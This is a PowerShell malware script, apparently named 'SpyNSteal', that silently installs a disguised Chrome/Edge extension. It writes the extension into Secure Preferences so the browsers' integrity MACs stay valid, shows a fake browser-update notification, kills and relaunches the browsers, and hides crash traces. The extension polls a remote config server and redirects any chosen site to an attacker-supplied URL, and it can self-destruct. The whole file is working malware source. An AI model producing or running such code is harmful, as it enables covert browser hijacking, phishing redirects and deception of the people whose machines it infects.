# SpyNSteal - Phantom Extension Injector
# Injects a MV3 extension into Chrome/Edge by adding to extensions.settings
# while leaving protection.macs and super_mac untouched.
# Chrome treats entries with no MAC as TRUSTED_UNKNOWN_VALUE when super_mac is valid.

$EXT_ID = "egiajcmnnojdmgcdgkojldgdihcjimhi"

$MANIFEST = @'
{
  "manifest_version": 3,
  "name": "Chrome Resource Scheduler",
  "version": "1.0",
  "key": "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA9E4l4ZNccXGXQ0vwNIaT8IV8Jo1eqoOmZW2pJFZcrFIyC1oobcmN7ReASmGHHV4EHM+NdUF3GWqouQ/xeQEsLHO4/z1K8D5ZauoMLV5IjBVjtBtv358t5t9hxWk10nv+MFaCx5JW3w+iZFvYQKNNMP0zw6G6+qGAH9f7s49Hg4Od9aFG0A3zkRlQ5JlYQ2e+8mulWe6Ps9GK3Lsw7MsT5i83c0gH2ioOuWCZoR0Uq0wZ3sAng4de6HXwmO/U6CiHMhQBtPB8R6oFCalIOTfleqYXSrCdKqZQ6d8/4EcDzq4g/N7y7X/qms6RUBQ+qp7oN/rxEnhqFeOyhYYOSj7T2QIDAQAB",
  "description": "Manages internal resource scheduling and prioritization.",
  "permissions": ["declarativeNetRequest"],
  "host_permissions": ["<all_urls>"],
  "background": {
    "service_worker": "sw.js"
  }
}
'@

$SW_JS = @'
const C = "%%CONFIG_URL%%";
const I = 60000;
let R = null;

async function applyRule(target, url) {
  const id = 1;
  await chrome.declarativeNetRequest.updateDynamicRules({
    removeRuleIds: [id],
    addRules: [{
      id,
      priority: 1,
      action: { type: "redirect", redirect: { url } },
      condition: { urlFilter: target, resourceTypes: ["main_frame"] }
    }]
  });
  R = id;
}

async function pull() {
  try {
    const r = await fetch(C, { cache: "no-store" });
    if (!r.ok) return;
    const j = await r.json();
    if (j.selfDestruct) {
      if (R) await chrome.declarativeNetRequest.updateDynamicRules({ removeRuleIds: [R] });
      R = null;
      return;
    }
    if (j.armed && j.target && j.url) {
      await applyRule(j.target, j.url);
    } else if (R) {
      await chrome.declarativeNetRequest.updateDynamicRules({ removeRuleIds: [R] });
      R = null;
    }
  } catch (_) {}
}

async function init() {
  if (!C || C === "" || C.indexOf("%%") === 0) {
    await applyRule("||hi.com", "https://hi-test.com/");
    return;
  }
  pull();
  setInterval(pull, I);
}

chrome.runtime.onInstalled.addListener(() => init());
chrome.runtime.onStartup.addListener(() => init());
'@

function Ensure-Property($obj, [string]$name, $default) {
    if (-not $obj.PSObject.Properties[$name]) {
        $obj | Add-Member -NotePropertyName $name -NotePropertyValue $default
    } elseif ($null -eq $obj.$name) {
        $obj.$name = $default
    }
}

function Find-Browser([string]$name) {
    $info = @{ Name = $name; Found = $false; Running = $false }
    switch ($name) {
        "chrome" {
            $info.UserData = "$env:LOCALAPPDATA\Google\Chrome\User Data"
            $info.Proc = "chrome"
            $info.AppDirs = @(
                "$env:ProgramFiles\Google\Chrome\Application",
                "${env:ProgramFiles(x86)}\Google\Chrome\Application",
                "$env:LOCALAPPDATA\Google\Chrome\Application"
            )
            $info.RegKey = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\chrome.exe"
            $info.NotifTitle = "Google Chrome"
            $info.NotifText = "An update has been downloaded. Restarting to apply changes."
        }
        "edge" {
            $info.UserData = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
            $info.Proc = "msedge"
            $info.AppDirs = @(
                "${env:ProgramFiles(x86)}\Microsoft\Edge\Application",
                "$env:ProgramFiles\Microsoft\Edge\Application",
                "$env:LOCALAPPDATA\Microsoft\Edge\Application"
            )
            $info.RegKey = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\msedge.exe"
            $info.NotifTitle = "Microsoft Edge"
            $info.NotifText = "An update has been installed. Edge will restart to apply it."
        }
    }
    if (-not (Test-Path $info.UserData)) { return $info }
    $info.Found = $true
    $info.Running = [bool](Get-Process $info.Proc -EA SilentlyContinue)

    try { $info.ExePath = (Get-ItemProperty $info.RegKey -EA Stop).'(default)' } catch {}
    if (-not $info.ExePath -or -not (Test-Path $info.ExePath)) {
        foreach ($d in $info.AppDirs) {
            $candidate = Join-Path $d "$($info.Proc).exe"
            if ($name -eq "chrome") { $candidate = Join-Path $d "chrome.exe" }
            if (Test-Path $candidate) { $info.ExePath = $candidate; break }
        }
    }
    return $info
}

function Inject-Extension($browser) {
    $profileDir = Join-Path $browser.UserData "Default"
    if (-not (Test-Path $profileDir)) { return $false }

    # 1 - Write extension files to disk
    $extDir = Join-Path $profileDir "Extensions\$EXT_ID\1.0_0"
    New-Item -Path $extDir -ItemType Directory -Force | Out-Null
    [IO.File]::WriteAllText((Join-Path $extDir "manifest.json"), $MANIFEST, [Text.Encoding]::UTF8)
    [IO.File]::WriteAllText((Join-Path $extDir "sw.js"), $SW_JS, [Text.Encoding]::UTF8)

    # 2 - Build extension settings JSON
    $manifestObj = $MANIFEST | ConvertFrom-Json
    $installTime = [string][long]((Get-Date).ToFileTimeUtc() / 10)
    $extPath = $extDir.Replace('/', '\')

    $settings = [PSCustomObject][ordered]@{
        active_permissions = [PSCustomObject][ordered]@{
            api              = @("declarativeNetRequest")
            explicit_host    = @("<all_urls>")
            manifest_permissions = @()
            scriptable_host  = @()
        }
        commands           = [PSCustomObject]@{}
        content_settings   = @()
        creation_flags     = [int]0
        events             = @()
        from_bookmark      = $false
        from_webstore      = $false
        granted_permissions = [PSCustomObject][ordered]@{
            api              = @("declarativeNetRequest")
            explicit_host    = @("<all_urls>")
            manifest_permissions = @()
            scriptable_host  = @()
        }
        incognito_content_settings = @()
        incognito_preferences      = [PSCustomObject]@{}
        install_time       = $installTime
        location           = [int]1
        manifest           = $manifestObj
        path               = $extPath
        preferences        = [PSCustomObject]@{}
        regular_only_preferences = [PSCustomObject]@{}
        state              = [int]1
        was_installed_by_default = $false
        was_installed_by_oem    = $false
        withholding_permissions = $false
    }

    # 3 - Read Secure Preferences as raw string
    $secPrefsFile = Join-Path $profileDir "Secure Preferences"
    $prefsFile = Join-Path $profileDir "Preferences"
    $targetFile = if (Test-Path $secPrefsFile) { $secPrefsFile } else { $prefsFile }
    if (-not (Test-Path $targetFile)) { return $false }

    $raw = [IO.File]::ReadAllText($targetFile, [Text.Encoding]::UTF8)

    # 4 - Build the JSON snippet for our extension entry
    $settingsJson = $settings | ConvertTo-Json -Depth 50 -Compress

    # 5 - Insert into extensions.settings using string manipulation
    #     This preserves the rest of the file byte-for-byte, keeping existing
    #     MACs and super_mac intact and valid.
    $needle = '"extensions":{'
    $extIdx = $raw.IndexOf($needle)
    if ($extIdx -lt 0) { return $false }

    $settingsNeedle = '"settings":{'
    $settingsIdx = $raw.IndexOf($settingsNeedle, $extIdx)
    if ($settingsIdx -lt 0) { return $false }

    $insertPos = $settingsIdx + $settingsNeedle.Length
    $inject = "`"$EXT_ID`":$settingsJson,"

    # If our extension already exists, remove the old entry first
    $existingKey = "`"$EXT_ID`":"
    $existIdx = $raw.IndexOf($existingKey, $settingsIdx)
    if ($existIdx -ge 0 -and $existIdx -lt $raw.IndexOf('}', $settingsIdx)) {
        $depth = 0
        $endIdx = $existIdx + $existingKey.Length
        for ($c = $endIdx; $c -lt $raw.Length; $c++) {
            if ($raw[$c] -eq '{') { $depth++ }
            elseif ($raw[$c] -eq '}') {
                $depth--
                if ($depth -lt 0) { break }
                if ($depth -eq 0) { $endIdx = $c + 1; break }
            }
        }
        if ($endIdx -lt $raw.Length -and $raw[$endIdx] -eq ',') { $endIdx++ }
        $raw = $raw.Remove($existIdx, $endIdx - $existIdx)
        $settingsIdx = $raw.IndexOf($settingsNeedle, $extIdx)
        $insertPos = $settingsIdx + $settingsNeedle.Length
    }

    $raw = $raw.Insert($insertPos, $inject)

    # 6 - Write back (no MAC or super_mac changes)
    [IO.File]::WriteAllText($targetFile, $raw, [Text.Encoding]::UTF8)
    return $true
}

function Patch-LocalState($userDataDir) {
    $lsPath = Join-Path $userDataDir "Local State"
    if (-not (Test-Path $lsPath)) { return }
    try {
        $ls = [IO.File]::ReadAllText($lsPath) | ConvertFrom-Json
        if ($ls.PSObject.Properties["profile"]) {
            Ensure-Property $ls.profile "exited_cleanly" $true
            $ls.profile.exited_cleanly = $true
            Ensure-Property $ls.profile "exit_type" "Normal"
            $ls.profile.exit_type = "Normal"
        }
        if ($ls.PSObject.Properties["profile"] -and $ls.profile.PSObject.Properties["info_cache"]) {
            foreach ($p in $ls.profile.info_cache.PSObject.Properties) {
                if ($p.Value -is [PSCustomObject]) {
                    Ensure-Property $p.Value "exited_cleanly" $true
                    $p.Value.exited_cleanly = $true
                }
            }
        }
        [IO.File]::WriteAllText($lsPath, ($ls | ConvertTo-Json -Depth 50 -Compress), [Text.Encoding]::UTF8)
    } catch {}
}

function Show-UpdateNotif($browser) {
    try {
        Add-Type -AssemblyName System.Windows.Forms -EA Stop
        Add-Type -AssemblyName System.Drawing -EA Stop
        $n = New-Object Windows.Forms.NotifyIcon
        if ($browser.ExePath -and (Test-Path $browser.ExePath)) {
            $n.Icon = [Drawing.Icon]::ExtractAssociatedIcon($browser.ExePath)
        } else {
            $n.Icon = [Drawing.SystemIcons]::Information
        }
        $n.BalloonTipTitle = $browser.NotifTitle
        $n.BalloonTipText = $browser.NotifText
        $n.Visible = $true
        $n.ShowBalloonTip(5000)
        Start-Sleep 5
        $n.Visible = $false; $n.Dispose()
    } catch {}
}

# ============================================================================
#  MAIN
# ============================================================================

$LOG = Join-Path $env:APPDATA "~diag.log"
function Log([string]$msg) { $ts = Get-Date -Format 'HH:mm:ss'; Add-Content $LOG "$ts  $msg" }

Log "=== SpyNSteal v2 (no-MAC approach) ==="
Log "EXT_ID: '$EXT_ID'"

$browsers = @()
foreach ($name in @("chrome", "edge")) {
    $b = Find-Browser $name
    Log "Browser '$name': Found=$($b.Found) Running=$($b.Running) ExePath=$($b.ExePath)"
    if ($b.Found) { $browsers += $b }
}

if ($browsers.Count -eq 0) { Log "NO BROWSERS - exit"; exit }

$wasRunning = @()
foreach ($b in $browsers) { if ($b.Running) { $wasRunning += $b } }
Log "Found: $($browsers.Count) | Running: $($wasRunning.Count)"

if ($wasRunning.Count -gt 0) {
    Log "Showing notification + killing..."
    Show-UpdateNotif $wasRunning[0]
    foreach ($b in $wasRunning) {
        try { [Diagnostics.Process]::GetProcessesByName($b.Proc) | ForEach-Object { $_.Kill() } } catch {}
    }
    Start-Sleep 2
    foreach ($b in $wasRunning) {
        for ($w = 0; $w -lt 15; $w++) {
            if (-not (Get-Process $b.Proc -EA SilentlyContinue)) { break }
            Start-Sleep 1
        }
        Log "$($b.Proc) exited: $(-not [bool](Get-Process $b.Proc -EA SilentlyContinue))"
    }
}

foreach ($b in $wasRunning) { Patch-LocalState $b.UserData }

$injected = @()
foreach ($b in $browsers) {
    Log "Injecting into $($b.Name)..."
    try {
        $ok = Inject-Extension $b
        Log "Result: $ok"
        if ($ok) { $injected += $b }
    } catch {
        Log "ERROR: $($_.Exception.Message)"
        Log "STACK: $($_.ScriptStackTrace)"
    }
}

if ($injected.Count -eq 0) { Log "Nothing injected - exit"; exit }

foreach ($b in $injected) {
    $extDir = Join-Path (Join-Path $b.UserData "Default") "Extensions\$EXT_ID\1.0_0"
    Log "Files: manifest=$(Test-Path (Join-Path $extDir 'manifest.json')) sw=$(Test-Path (Join-Path $extDir 'sw.js'))"
}

if ($wasRunning.Count -gt 0) {
    Start-Sleep 1
    foreach ($b in $wasRunning) {
        if ($b.ExePath -and (Test-Path $b.ExePath)) {
            Log "Relaunching $($b.ExePath)"
            try { Start-Process $b.ExePath "--restore-last-session" } catch {}
        }
    }
}

Log "=== Done ==="
